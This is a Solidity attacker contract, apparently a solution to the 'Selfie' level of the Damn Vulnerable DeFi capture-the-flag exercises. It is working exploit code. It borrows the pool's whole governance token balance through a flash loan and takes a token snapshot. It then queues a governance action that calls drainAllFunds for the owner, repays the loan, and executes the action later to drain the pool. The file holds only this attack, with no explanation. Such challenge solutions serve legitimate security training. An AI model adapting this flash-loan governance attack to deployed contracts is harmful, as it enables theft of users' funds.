pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SelfieAttacker {
    address immutable owner;
    SelfiePool immutable selfiePool;
    SimpleGovernance immutable simpleGovernance;
    uint public actionId;

    constructor(address _owner, address _selfiePool, address _simpleGovernance) {
        owner = _owner;
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function attack() external {
        uint amountInPool = selfiePool.token().balanceOf(address(selfiePool));

        selfiePool.flashLoan(amountInPool);
    }

    function drainFunds() external {
        simpleGovernance.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 borrowAmount) public {
        DamnValuableTokenSnapshot(address(selfiePool.token())).snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);

        IERC20(token).transfer(address(selfiePool), borrowAmount);
    }
}
